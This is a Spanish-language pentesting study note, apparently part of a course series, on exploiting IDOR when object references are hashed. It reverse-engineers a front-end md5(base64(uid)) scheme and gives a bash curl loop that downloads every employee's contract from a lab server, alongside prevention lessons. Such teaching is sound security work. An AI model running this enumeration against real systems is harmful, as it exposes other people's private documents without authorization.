---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - IDOR
Fecha de actualización: 2026-07-15
Nota previa: "[[08 - Enumeración masiva de IDOR]]"
Nota siguiente: "[[10 - IDOR en APIs inseguras]]"
Area: "[[Web Attacks.base|Web Attacks]]"
---
---

Cuando la referencia no está en claro sino **hasheada o codificada**, la enumeración se complica pero rara vez es imposible. La clave suele estar en el **front-end**: si la app calcula el hash en JavaScript, podemos replicar el cálculo.

# El escenario: referencia hasheada

En la funcionalidad *Contracts* del *Employee Manager*, descargar un contrato lanza un `POST` a `download.php` con:

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Usar un `download.php` intermediario (en vez de enlazar directo al fichero) es buena práctica. El valor parece un `MD5`. Los hashes son funciones de **un solo sentido**: no se decodifican. El ataque es **adivinar la preimagen**: hashear valores candidatos (`uid`, username, filename) y comparar.

```shell-session
$ echo -n 1 | md5sum
c4ca4238a0b923820dcc509a6f75849b  -
```

No coincide con `cdd96d3...`. Podríamos probar más campos (o fuzzear con **Burp Comparer**), pero si el hash fuera de un valor único e impredecible, sería una **Secure Direct Object Reference**. El fallo fatal está en otro sitio.

# Function Disclosure: el hash se calcula en el front-end

Como la mayoría de apps modernas usan frameworks JS (`Angular`, `React`, `Vue.js`), muchos desarrolladores cometen el error de <mark style="background: #FFB86CA6;">ejecutar funciones sensibles en el cliente</mark>, exponiéndolas. Aquí, el enlace llama a `javascript:downloadContract('1')`:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

<mark style="background: #ADCCFFA6;">El valor hasheado es `btoa(uid)`</mark> — el `uid` codificado en `base64`, luego pasado por `MD5`. Es decir: `contract = md5(base64(uid))`. Lo reproducimos para `uid=1`:

```shell-session
$ echo -n 1 | base64 -w 0 | md5sum
cdd96d3cc73d1dbdaffa03cc6cd7339b  -
```

<mark style="background: #FF5582A6;">Coincide</mark>. Hemos revertido la técnica de hashing → las referencias vuelven a ser enumerables.

> [!warning]+ `-n` y `-w 0` importan
> `echo -n` evita el salto de línea final y `base64 -w 0` evita el wrapping. Si hasheas el `\n` de más, el `MD5` cambia por completo y nada coincide. Este tipo de detalle rompe muchos exploits de hashing — cuídalo siempre.

# Enumeración masiva

Generamos el hash de cada `uid` y hacemos `POST` a `download.php`:

```bash
#!/bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

`-O` guarda con el nombre del servidor, `-J` respeta `Content-Disposition`, `tr -d ' -'` limpia la salida de `md5sum`. Resultado: descargamos **todos** los contratos de los empleados 1-10.

# Lecciones (y matices modernos)

- <mark style="background: #8000E1A6;">Codificar/hashear la referencia **no** es control de acceso</mark>. Solo dificulta la enumeración, y si el cálculo está en el cliente, ni eso.
- **Nunca calcular hashes de referencias en el front-end.** Deben generarse en el servidor al crear el objeto y almacenarse. Ver [[12 - Detección, evasión y prevención de IDOR|prevención]].
- Si no ves el código, identifica el algoritmo por longitud/charset (`hashid`, `hash-identifier`) y prueba combinaciones (`md5(uid)`, `md5(base64(uid))`, `sha1(uid+salt)`…). **CyberChef** es ideal para reconstruir cadenas de transformación (`base64` → `MD5`) rápidamente.
- Este caso es *function disclosure*: la lógica sensible expuesta en JS. Es también un vector de [[07 - Identificación de IDORs|recon]] — mina siempre los `.js` en busca de cómo se construyen las referencias.

En la siguiente sección subimos de nivel: IDOR no solo para **leer** ficheros, sino para **invocar funciones** en [[10 - IDOR en APIs inseguras|APIs inseguras]].

## Referencias

- PortSwigger — [IDOR](https://portswigger.net/web-security/access-control/idor)
- GCHQ — [CyberChef](https://gchq.github.io/CyberChef/) (reconstruir cadenas encode/hash)
- HTB Academy — *Web Attacks* (base, 2021)
